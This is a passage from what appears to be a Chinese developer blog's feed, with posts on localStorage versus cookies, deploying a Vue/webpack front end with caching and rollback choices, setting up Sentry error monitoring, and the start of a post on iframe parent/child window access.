title="模版风格"></a>模版风格</h4><p>系统默认提供了一些模版供我们使用，个人比较喜欢清爽和简单两个风格</p><p>选中某个风格之后，最好就不要过多更改内部色调了，否则看起来会杂乱</p><p>有的时候系统的走向不符合我们的需求，这个时候我们可以选中某个模块，右侧菜单会出现结构选项，我们就可以自由选择从左到右或者从上到下，子分支全都集中在一侧，鱼骨图以及SWOT分析等各个场景的结构</p><p>比较喜欢<strong>打开彩虹分支</strong>，色彩上会更清晰一些</p><p><strong>关掉线条渐细</strong>，因为写代码一般是时序图，并没有明显的层级关系，所以没必要打开线条渐细</p><p>这样组合起来，加上一些自己的设计基本就可以画出丰富多彩，美观清晰的mind map了。</p><p>一起来画精致的mind map，让pm对你刮目相看，自惭形秽吧~</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>以后遇到实际例子再补充此文</p>]]></content>
      
      
      
        <tags>
            
            <tag> Tool </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 缓存 」localStorage实践指南</title>
      <link href="/2019/02/20/localStorage/"/>
      <url>/2019/02/20/localStorage/</url>
      
        <content type="html"><![CDATA[<p>记录localStorage在实践中遇到的具体问题。</p><h4 id="localStorage和cookie的区别"><a href="#localStorage和cookie的区别" class="headerlink" title="localStorage和cookie的区别"></a>localStorage和cookie的区别</h4><h5 id="1-大小"><a href="#1-大小" class="headerlink" title="1.大小"></a>1.大小</h5><p>localStorage可以存储大约5M的数据，cookie一般只能存储4kb。<br>两者都有大小限制，不同浏览器单次设置的大小和总条数会有差异，需要做好超过限制之后的处理</p><h5 id="2-兼容性"><a href="#2-兼容性" class="headerlink" title="2.兼容性"></a>2.兼容性</h5><p>cookie由来已久，几乎所有浏览器都支持，兼容性更好<br>localStorage支持&gt;=IE8，还有些特别的情况下兼容性不好：<br>ie11下用户保护模式下调用<code>window.localStorage</code>直接报错<br>禁止cookie时调用<code>window.localStorage</code>直接报错，但<code>document.cookie</code>不会报错<br>safari无痕模式下cookie是可用的，localStorage存在但是setItem时会报错(chrome的无痕模式localStorage和cookie都可用，只不过关闭浏览器之后会清除)</p><h5 id="3-特性"><a href="#3-特性" class="headerlink" title="3.特性"></a>3.特性</h5><p>cookie在每次请求中都会携带，server端可以CRUD cookie，但是localStorage只是种浏览器存储方式而已，server端无法操作<br>cookie必须url encode<br>cookie可以设置如下属性：</p><ul><li>HTTPOnly：避免被js操作保证安全</li><li>expire：有过期时间</li><li>secure：必须在https下传输</li><li>path：不同页面可以设置不同path避免多个tab之间数据污染<br>localStorage没有这些功能，只有key，value设置，需要约定好避免存储的key，避免数据污染</li></ul><h5 id="4-持久性"><a href="#4-持久性" class="headerlink" title="4.持久性"></a>4.持久性</h5><p>浏览器缓存中小白用户可能也知道怎么清除cookie，但是localStorage被清除的概率会低一些，所以可以使用LS来存储设备指纹</p><h5 id="5-跨域限制"><a href="#5-跨域限制" class="headerlink" title="5.跨域限制"></a>5.跨域限制</h5><p>sessionStorage不能共享，localStorage在同源document间共享，cookie在同源且符合path规则的文档间共享</p><h4 id="localStorage的使用注意"><a href="#localStorage的使用注意" class="headerlink" title="localStorage的使用注意"></a>localStorage的使用注意</h4><h5 id="1-安全问题"><a href="#1-安全问题" class="headerlink" title="1.安全问题"></a>1.安全问题</h5><p>一旦有xss漏洞，有坏人可能将恶意代码注入到localStorage中，导致即便修复了xss恶意代码也存在的问题。 所以遇到这种情况一定要注意发新版清除用户端的localStorage。</p><h5 id="2-为何静态资源JS-CSS不存在localStorage中"><a href="#2-为何静态资源JS-CSS不存在localStorage中" class="headerlink" title="2.为何静态资源JS/CSS不存在localStorage中"></a>2.为何静态资源JS/CSS不存在localStorage中</h5><ul><li>SEO：之前本站在robots.txt中禁止抓取assets目录（包括CSS和JS等），导致google搜索中出现页面不适合移动端访问的提示，影响了SEO。如果将JS/CSS存储在localStorage中可能会导致爬虫抓到的页面错误。</li><li>FOUC:如果先输出HTML然后再从JS中读取CSS加载，会造成页面闪烁，体验很差</li><li>PC和移动端的考虑：PC端网速比较快，浏览器兼容性没那么好，使用localStorage的意义不大，移动端倒是支持的比较好，而且网速慢，是一个比较好的优化点</li><li>真的有必要吗：如果JS和CSS等静态资源设置合理的缓存和过期时间，localStorage读取并执行可能并不如from disk cache甚至不如304协商缓存快</li></ul><h5 id="3-不兼容情况下的处理"><a href="#3-不兼容情况下的处理" class="headerlink" title="3.不兼容情况下的处理"></a>3.不兼容情况下的处理</h5><p>safari无痕模式下localStorage和sessionStorage本身是存在的，只是setItem会报错</p><p>有些浏览器不支持storage或者用户设置禁止了localStorage，调用<code>window.localStorage</code>时都会直接报错</p><p>Sentry上大量抓到这样的错误</p><blockquote><p>Failed to read the ‘localStorage’ property from ‘Window’: Access is denied for this document.<br>兼容性还是要考虑好，最好使用try catch来判断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let isSupportStorage = false;</span><br><span class="line">try &#123;</span><br><span class="line">  localStorage.setItem(&apos;testStorage&apos;, 1);</span><br><span class="line">  isSupportStorage = true;</span><br><span class="line">&#125; catch (e) &#123;</span><br><span class="line">  // 无痕模式或者不支持storage</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><h4 id="localStorage和sessionStorage的区别"><a href="#localStorage和sessionStorage的区别" class="headerlink" title="localStorage和sessionStorage的区别"></a>localStorage和sessionStorage的区别</h4><p>sessionStorage存储数据只在本次会话有效，数据仅在当前窗口有效，即不能跨tab</p>]]></content>
      
      
      
        <tags>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 基础设施 」现代化前端工程发布</title>
      <link href="/2019/02/20/static_deploy/"/>
      <url>/2019/02/20/static_deploy/</url>
      
        <content type="html"><![CDATA[<h4 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h4><p>接手八年没重构的老项目，每个字符都透露着远古时期历史的气息，之前的你可能不懂那些性能优化上的思考，看了这种古老的项目，你马上就能get到现代文明之光的美好。</p><p>重写不是没想过的，一万次深呼吸准备大干一场，一万次管住了自己爪爪。</p><p>你还年轻，谁知道哪个页面是需要用的，哪里会藏着深坑。</p><p>加一些打点统计，熟悉代码好几年，终于可以开始重构了，但是当然不能操之过急，一下推倒重来，我们选择从新增页面开始，再慢慢将老的部分迁移到新的现代化的开发模式。</p><p>嗯，新项目开始啦。我们简单的选择vue+webpack+babel，完全<strong>前后端分离</strong>的开发模式，代码层面不深入展开来说，今天只讲前端静态发布。</p><a id="more"></a><p>vue-cli生成新项目，npm run buid得到dist目录。index.html（下文以入口文件相称），还有css，js等（下文以静态资源相称），前端说来说去就是HTML，js，css三剑客，让我们开始部署吧。</p><h4 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h4><p>部署有啥好说的，全丢到静态服务器上，用户可以访问到就可以了呗。</p><p>各种404，路径没配置好，改下vue.config.js的publicPath。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  publicPath: process.env.NODE_ENV === <span class="string">'production'</span> ? <span class="string">'//static.evacoder.com/userCenter/'</span> : <span class="string">''</span>,</span><br><span class="line">  devServer: &#123;</span><br><span class="line">    disableHostCheck: <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">// 所有匹配不到的请求都映射到此域名下</span></span><br><span class="line">    <span class="comment">// 1.配置host 127.0.0.1到 evacoder.com</span></span><br><span class="line">    <span class="comment">// 再将localhost:8080 nginx代理到 127.0.0.1:80 就可以绕过登录态了</span></span><br><span class="line">    proxy: <span class="string">'https://evacoder.com'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ok~再部署一把。</p><p>哦？可是我们静态服务器的域名是static.evacoder.com。</p><blockquote><p>Access to XMLHttpRequest at ‘<a href="https://evacoder.com/getData">https://evacoder.com/getData</a>‘ from origin ‘<a href="https://static.evacoder.com" target="_blank" rel="noopener">https://static.evacoder.com</a>‘ has been blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource.</p></blockquote><p>又见到了我们的老朋友<strong>跨域</strong>，毕竟你不是native开发，不用管跨域的问题。</p><h4 id="部署路径"><a href="#部署路径" class="headerlink" title="部署路径"></a>部署路径</h4><p>妥协吧，把dist文件夹直接丢到server端项目里吧，或者静态资源上cdn，至少把入口文件丢在人家的地盘下。</p><p>将入口文件放在server端的项目主要有下面这些考虑：</p><ul><li>跨域</li></ul><p>静态项目发布之后一般都需要另一个域名来访问，比如static.evacoder.com。用户通过static.evacoder.com来访问的话会很丑陋很奇怪。</p><p>更重要的是api接口在evacoder.com下会有跨域的问题。所以一般index.html放在server端的项目下就不会跨域了。</p><p>但是实际上可以通过nginx的配置来解决这个问题，通过proxy_pass<strong>反向代理</strong>一下，将static.evacoder.com/center/index反向代理到evacoder.com下就不会跨域了，可以解决这个问题。</p><p>nginx可以解决很多问题，感兴趣查看这篇（TODO，nginx加成，提升前端开发效率）。</p><ul><li>上线先后</li></ul><p>是有可能存在这样的需求，【修改某个api参数sex从0，1，2改为male，female，unknown】。</p><p>如果前后端代码放在一起的话，开发完这个功能一起上线即可。</p><p>（一起上线的意思是：因为代码放在一起，后端是一台一台机器的上线，比如有5台机器，上线的过程中上到第2台机器的时候，第2台机器就会被摘掉，用户只能访问到剩下4台，第2台机器自己就在后面悄咪咪的部署，部署完成了之后又回到用户可访问的状态，不会出现FE上完了，api没上完的情况）</p><p>但是如果动静分离部署的话，就会存在谁先上线的问题。</p><p>如果server先上线，FE还没修改，参数不匹配，会400错误。</p><p>如果FE先上线，server不能接受新改的参数。</p><p>一个功能需要前后端协同开发，功能上有依赖，如果不能一起发布的话，总是会出现用户暂时访问有问题的情况。</p><p>正常情况下我们不能放弃任何一丝流量（当然也是为了自己，免得为了降低影响眼圈黑黑半夜上线）</p><p>一般情况下只能server端做api参数兼容了，觉得冗余的话之后再去掉兼容的代码。</p><p>（其实倒也不用想这个问题，前后端分离的好处之一就是：后端提供的接口也可以给提供给native客户端使用，他们的代码一发出去就永远在用户手中，总是会有用户没有更新版本，后端的兼容一定必须存在）。</p><ul><li>回滚先后</li></ul><p>同理，分离部署还涉及到分离回滚。反正如果有bug，谁先回滚谁后回滚还需要考虑吗？</p><p>还是刚刚那个例子，将【修改某个api参数sex从0，1，2改为male，female，unknown】的功能回滚。</p><p>希望后端上次的api兼容没有删掉，就可以让前端先回滚。如果删掉了，只能开发之后再回滚了。</p><p>为了避免这种上线回滚先后的问题，我本来是希望能把前端打包的入口文件放在服务端来拒绝任何一点流量损失，但是我们经常会遇到前端只修改一个js，css甚至只是一行文案而已，都需要协同后端编译打包整体上线。</p><p>本来是希望如果是简单的修改，就直接把前端入口文件index.html scp到线上机器，如果是前后端有依赖性的修改，则可以同时部署。</p><p>但是上线有规范，操作不安全，没能达成希望，再考虑到下面分离部署的优点：</p><p>1.前端把握主动权，分离部署不需要求后端同学帮忙部署了，充满了前端自豪感嘻嘻。</p><p>2.保持服务稳定性，前端改一行文案都需要经过后端100台机器重新上线实在太不安全了。</p><p>3.上线快，前端经常会被催着改行文案赶紧上线，静态部署分分钟就可以完成，而后端上线却需要很多台机器需要很长时间。</p><p>4.权责分明，谁的问题谁负责。</p><p>商量一下，后端同学回想起帮我们上线个文案要点100台机器的痛苦往事，肯定还是会选择动静分离部署，接口兼容这种比较少见的情况之后再说吧。我们还是选择了眼前的利益，<strong>先不过度设计</strong>，分开部署。</p><p>一般的需求，后端先上线接口，前端再直接发布。</p><h4 id="服务端渲染首屏直出"><a href="#服务端渲染首屏直出" class="headerlink" title="服务端渲染首屏直出"></a>服务端渲染首屏直出</h4><p>是否有必要SSR</p><ul><li>直出：数据填充好再返回</li></ul><p>对于不需要数据填充的呢？</p><p>传统的后端是数据服务端</p><p>中间层服务端去数据服务端请求数据，然后渲染完整的页面</p><p>分离是分工，让每个人做自己专业的工作，发挥最大的作用，而不是为了分离而分离。</p><p>这里说的首屏渲染速度并不是说页面加载的速度</p><p>服务器渲染HTML，是因为能够提高用户第一次访问网站的感知性能，第一个HTTP请求就能够返回可以<strong>渲染完</strong>的HTML，用不着浏览器端多一个AJAX请求去获取数据再渲染，这样用户就会感觉到这网站性能挺快。</p><p>这里重点在于展示的<strong>数据是ajax请求返回还是后端直接填充</strong>。</p><p>现在的服务端渲染和以往的不一样的可能是，之前是脏乱的服务端填充模版引擎，现在依然是返回json数据前端来解析，分工依然很明确，只是从ajax转成了后端直接返回数据。</p><p>不该SPA的也强行SPA，好在我们有code split &amp; aync loading</p><p>SEO 本质是一个服务器向另一个服务器发起请求，解析请求内容。但一般来说搜索引擎是不回去执行请求到的js的。也就是说，如果一个单页应用，html在服务器端还没有渲染部分数据数据，在浏览器才渲染出数据，而搜索引擎请求到的html是没有渲染数据的。 这样就很不利于内容被搜索引擎搜索到。 所以服务端渲染就是尽量在服务器发送到浏览器前 页面上就是有数据的。</p><h4 id="部署系统做了哪些事"><a href="#部署系统做了哪些事" class="headerlink" title="部署系统做了哪些事"></a>部署系统做了哪些事</h4><p>我司的部署系统封装了puppet等开源项目，在git项目中加上deploy文件之后，部署系统就可以从git上拉代码，（其实就是创建了用户，git clone下来），编译的时候选择git版本进行编译。</p><p>deploy文件写明了copy git项目到哪个机器上。</p><p>发布机提供了docker image，来提供稳定性和编译能力，可以选择安装node,npm,nginx等。</p><p>1.git项目添加部署文件（deploy文件）</p><p>2.创建部署任务，方便权限控制和追溯。</p><p>基本上可以理解为在线上机器上执行以下操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@git.n.evacoder.com:demo/eva-blog.git</span><br><span class="line"><span class="built_in">cd</span> eva-blog</span><br><span class="line"><span class="comment"># 更新代码</span></span><br><span class="line">git pull</span><br><span class="line"><span class="comment"># 部署不同的分支及版本</span></span><br><span class="line">git checkout v2</span><br><span class="line">npm run build</span><br><span class="line"><span class="comment"># 将内容copy到线上路径</span></span><br><span class="line">mv dist ../online/dist</span><br></pre></td></tr></table></figure><h4 id="缓存设置"><a href="#缓存设置" class="headerlink" title="缓存设置"></a>缓存设置</h4><p>静态发布很重要的一个考量是缓存设置。</p><p>静态资源因为webpack生成了版本号，可以全部都设超长缓存时间。</p><p>我们不仅仅可以使用webpack的基础功能，分离第三方资源成vendor.js，对于稳定的功能，也可以在webpack中抽离出来，分成经常改的文件和不经常修改的，保证最优的缓存策略。</p><p>但是入口文件呢？静态资源更新的再好，入口文件有缓存，新版总是触达不到用户。</p><p>html相比于后端return的jsp会有缓存？</p><p>no，其实后端return的jsp也是设置之后才禁用了缓存，对于html，我们可以加上下面的meta信息：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"pragma"</span> content=<span class="string">"no-cache"</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Cache-Control"</span> content=<span class="string">"no-cache, must-revalidate"</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"expires"</span> content=<span class="string">"0"</span>&gt;</span><br></pre></td></tr></table></figure><p>经常听说前后端分离不利于SEO，</p><p>no，没有差别，甚至因为分离之后，访问的url更清爽越短越利于seo。</p><h4 id="覆盖or非覆盖式发布"><a href="#覆盖or非覆盖式发布" class="headerlink" title="覆盖or非覆盖式发布"></a>覆盖or非覆盖式发布</h4><p>一般情况下我们都是覆盖式发布，比如发布 <a href="http://evacode.com/static/a.js?v=1.0" target="_blank" rel="noopener">http://evacode.com/static/a.js?v=1.0</a> ，每次都覆盖原本的a.js，为了避免缓存，每次上线修改版本v来避免缓存。</p><p>如果使用webpack，前端修改之后npm run build，如果相关文件有修改，webpack生成的hash值会改变，这样就有最优的缓存策略。</p><p>每次生成的静态资源的路径不一样，那每个版本（至少上一个版本的js，css）需要保留下来吗？</p><p>当然是为了回滚考虑，如果新build出来的有bug怎么办？</p><p>如果使用非覆盖式发布，所有build出来的静态资源都放着，时间久了会很耗费资源，唯一的好处是方便回滚。</p><p>如果使用覆盖式发布，回滚是不可能回滚了，因为原来的版本已经被删掉了，但是反正有git来版本管理，可以选择1.轻松revert之后再部署，2.徒手改bug之后重新build后部署。</p><p>我司的部署系统是与git关联，可以直接选择对应的git版本，都不需要手动再次revert代码git提交，更没有必要选择非覆盖式发布了。</p><p>前人使用的是和git commit号一致的版本号来非覆盖式发布，实际只需要210kb，但是存储以前的版本7年了，现在占用的磁盘资源有4.5g了，非常的浪费，而且年代久远也不敢贸然删除，非覆盖式其实意义并不大。</p><p>覆盖式发布并没有太大的影响，而且更清爽。</p><p>反正是静态资源不需编译，更有机智的小伙伴选择git-hook来发布，merge到master的时候自动覆盖服务器上的文件，瞬间完成部署，回滚时也是git reset下，但考虑到权限控制，查问题追溯方便，专门的部署系统存在肯定有其意义。（虽然仔细想想，仅就静态资源来说，gitlab也能提供这些功能，就是需要绕绕弯，专门的部署系统是为了提供所有语言代码的部署支持的）。</p><h4 id="需要使用专门的发布机来build发布吗"><a href="#需要使用专门的发布机来build发布吗" class="headerlink" title="需要使用专门的发布机来build发布吗"></a>需要使用专门的发布机来build发布吗</h4><p>还有一个问题是是否有必要去本地化操作，使用发布机来进行npm run build。</p><p>我个人觉得package.json已经写明了依赖的版本，所以可能意义不太大。</p><p>虽然package.json保证了环境的一致性，但是还是会出现打包出来不一致的问题么？</p><h4 id="cdn的使用"><a href="#cdn的使用" class="headerlink" title="cdn的使用"></a>cdn的使用</h4><p>如果使用cdn，非覆盖式发布更浪费资源，我们需要将js，css等放到cdn上，修改入口文件的路径。</p><p>经常看了很多前端性能优化的方案，回答面试题时头头是道，动不动就上cdn，动静分域名部署等等，实则是纸上谈兵，道理是那个道理，但这次请教sre同学也有了新的思考，落地时真的应该和sre同学探讨一下。</p><p>需要除前端之外的同学参与的性能优化方案，都需要评估。</p><p>cdn能够提高访问速度，但是有没有容灾方案，收效与风险孰轻孰重。cdn回源带来的抖动也是很严重的，需要评估回滚的方案，不要蹭别人的用，因为别人的流量打满了最后也会导致我们的服务挂掉，分摊成本也要考虑。</p><p>http2，ipv6他们都比我们专业，了解背后的故事。</p><h4 id="路由的配置"><a href="#路由的配置" class="headerlink" title="路由的配置"></a>路由的配置</h4><p>需要配置nginx的还有：route使用history需要后端配置，使用hash会比较奇怪。</p><p>参照<a href="https://router.vuejs.org/zh/guide/essentials/history-mode.html" target="_blank" rel="noopener">vue 文档</a>来处理。</p>]]></content>
      
      
      
        <tags>
            
            <tag> team </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 基础设施 」前端异常监控系统</title>
      <link href="/2019/02/19/sentry/"/>
      <url>/2019/02/19/sentry/</url>
      
        <content type="html"><![CDATA[<p>遇上有人反馈bug你一般都怎么处理？</p><a id="more"></a><h4 id="bug反馈"><a href="#bug反馈" class="headerlink" title="bug反馈"></a>bug反馈</h4><p>先看看内网下自己的设备是否有报错，定位是线上问题or内网问题，内网报错：回滚内网分支。</p><p>线上报错：查看是普遍问题还是兼容性问题</p><ul><li>普遍问题着手fix</li><li>兼容性问题，询问用户设备信息，使用模拟器或者找测试同学使用相同测试机来复现，可以复现之后，如果是pc端可以f12来查看报错信息并定位（熟练使用devtool，最好有sourcemap来直接定位），移动端则使用远程调试（remote debugging 等在chrome或safari中进行复现，并定位问题））</li></ul><p>从上面我们可以发现，测试虽然测了大部分机型，但是js裸奔在各式各样的设备上，你真的能放心吗？</p><p>反馈问题我们需要：1.设备信息，2.报错提示，3.复现流程</p><p>内部反馈还好，如果是小白用户，根本不知道如何F12，更不要提移动端的错误调试，用户反馈到的很有可能就是一句（点了没反应，白屏之类的没有太多用处的信息）。</p><p>最近抛弃了ie8，各种新技术都可以用起来了。虽然使用webpack，babel已经很成熟了，也封装的越来越好，</p><p>一行browserlist&gt;1%就可以保证所有的兼容性。但是难免还是有点心慌，antd圣诞彩蛋自己被辞了也没办法找他们要赔偿啊？</p><p>虽然有内网灰度，等着别人反馈问题？周期很长的，灰度3个月你受得了？</p><p>这个时候我们真的非常需要一个前端的异常监控系统，复现流程先不奢求，只要有设备信息，js报什么错，具体的行数，一般也可以定位到问题了。</p><h4 id="异常监控系统的原理"><a href="#异常监控系统的原理" class="headerlink" title="异常监控系统的原理"></a>异常监控系统的原理</h4><p>如果让你自己实现一个异常监控系统你会怎么做？</p><p>最核心的API就是window.onerror，触发window.onerror的时候，将所有获取到的错误信息都发送一个请求到server端。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">msg, url, lineNo, columnNo, error</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当代码中的 promise reject 的时候，onerror 是捕获不到异常的。对于 promise reject 的异常，除了对每个用到 promise 的地方都加上 catch 之外，我们还应该在全局环境下进行一个兜底。</p><p>我们可以监听全局 unhandledrejection 事件：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'unhandledrejection'</span>, (e) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>如果要阻止异常输出到控制台上，可以加上 e.preventDefault()。<br>通过发送请求还可以获取到设备的UA信息，ip地址。</p><p>但是线上运行的代码都是打包压缩的，报错信息并不具体，不好定位，我们需要生成sourcemap文件便于debug。</p><h4 id="sentry的使用"><a href="#sentry的使用" class="headerlink" title="sentry的使用"></a>sentry的使用</h4><p>一般公司也不会自建异常监控系统，现在有很成熟的方案，这里推荐使用sentry。</p><p>接入只需要：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"https://browser.sentry-cdn.com/4.6.4/bundle.min.js"</span> crossorigin=<span class="string">"anonymous"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  Sentry.init(&#123;</span><br><span class="line">    dsn: <span class="string">'https://57b032907e35480d991114d212fcdda4@sentry.evacoder.com/2'</span>,</span><br><span class="line">    ignoreErrors: [],</span><br><span class="line">    release: <span class="string">"&lt;%= htmlWebpackPlugin.options.sentryRelease%&gt;"</span>,</span><br><span class="line">  &#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>或者使用npm直接安装也行，使用类似。</p><p>不用担心sentry的兼容性，因为sentry也是hook了window.onerror，而window.onerror所有浏览器有标准实现。</p><p>咋hook你懂的，可以复习下我写的这篇 <a href="https://www.evacoder.com/2019/02/15/iframe_security/" target="_blank" rel="noopener">万物皆可hook</a>。</p><p>需要注意的是我们的老朋友跨域，js报错也是会跨域的=_=#，&lt;script&gt;引入的不同源js中的错误，window.onerror只能捕获到Script error，需要在script标签添加<code>crossorigin</code>属性，并配置CORS。</p><p>iframe，css，img这些标签捕获不到错误。</p><p>另外需要注意的是：sourcemap暴露在外网可能会导致源码泄漏，所以我们部署时一定要记得去掉sourcemap。有了sentry之后我们更可以直接去掉外网暴露的sourcemap，一样可以快速定位报错具体信息。</p><p>配置sentry的sourcemap，以vue.config.js为例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> SentryPlugin = <span class="built_in">require</span>(<span class="string">'@sentry/webpack-plugin'</span>);</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  productionSourceMap: <span class="literal">false</span>,</span><br><span class="line">  configureWebpack: &#123;</span><br><span class="line">    plugins: [</span><br><span class="line">      <span class="keyword">new</span> SentryPlugin(&#123;</span><br><span class="line">        include: <span class="string">'./dist'</span>,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="部署搭建sentry"><a href="#部署搭建sentry" class="headerlink" title="部署搭建sentry"></a>部署搭建sentry</h4><p>参考文档可以通过docker来部署sentry<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/getsentry/onpremise.git</span><br></pre></td></tr></table></figure></p><p>按照github上的步骤一步步部署</p><p>遇到其他问题去看<a href="https://docs.sentry.io" target="_blank" rel="noopener">文档</a>，不会看文档还做程序员是害人害己哈哈哈。</p>]]></content>
      
      
      
        <tags>
            
            <tag> team </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 HTML 」iframe100问</title>
      <link href="/2019/02/18/iframe/"/>
      <url>/2019/02/18/iframe/</url>
      
        <content type="html"><![CDATA[<p>上篇说到iframe弹窗的登录安全，接下来我们带着问题出发，详细的了解下iframe这个历史的产物。</p><p>虽然足够古老，但是也能解决很多现代的问题。<br><a id="more"></a></p><h4 id="Frame-间的关系"><a href="#Frame-间的关系" class="headerlink" title="Frame 间的关系"></a>Frame 间的关系</h4><p>在页面中，window.top是最顶层的window，window和self都是当前window，window.parent是外层父window。</p><p>对于不存在 iframe 的页面，self，window，parent，top 这四者都相等，还有一个这 iframe中最常用的属性，frames</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span> === <span class="built_in">window</span>.frames <span class="comment">// 很奇怪的是这个一直都是true，在有子iframe的页面也是</span></span><br></pre></td></tr></table></figure><p>在有子 iframe 的页面中，这个<code>window.frames</code>就是本页面中包含的直接子frame的类数组，这个属性连接了frame 的parent，child，siblings，但是这个类数组中的元素不是直接的iframe dom，而是iframe的contentWindow，相当于是iframe环境下的window对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span> === <span class="built_in">window</span>.frames <span class="comment">// 一直都是true，所以在有子iframe的页面，window居然也是类array</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">'iframe'</span>)[<span class="number">0</span>].contentWindow === <span class="built_in">window</span>.frames[<span class="number">0</span>]; <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h4 id="父frame操作子frame"><a href="#父frame操作子frame" class="headerlink" title="父frame操作子frame"></a>父frame操作子frame</h4><p>主要通过window.frames来操作，有时候获取到子 frame 的属性为 undefined，那是因为子frame加载需要时间，要注意等子frame加载完成之后再获取。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fr1Window = <span class="built_in">window</span>.frames[<span class="number">0</span>]; <span class="comment">// 或者document.getElementsByTagName("iframe")[0].contentWindow;</span></span><br><span class="line"><span class="comment">// 操作dom</span></span><br><span class="line">fr1Window .document.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].style.backgroundColor = <span class="string">"#ff6700"</span>;</span><br><span class="line"><span class="comment">// 操作变量</span></span><br><span class="line">fr1Window.arr1=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">fr1Window.arr1.push(<span class="string">'Eva'</span>);</span><br><span class="line"><span class="comment">// 操作src</span></span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">"iframe"</span>)[<span class="number">0</span>].src=<span class="string">'https://evacoder.com'</span>;</span><br></pre></td></tr></table></figure><h4 id="子frame操作父frame"><a href="#子frame操作父frame" class="headerlink" title="子frame操作父frame"></a>子frame操作父frame</h4><p>主要通过window.parent来操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> parentWindow = <span class="built_in">window</span>.parent;<span class="comment">// window.top 是在多层级的页面中最顶层window</span></span><br><span class="line"><span class="comment">// 操作dom</span></span><br><span class="line">parentWindow .document.getElementsByTagName(<span class="string">"body"</span>)[<span 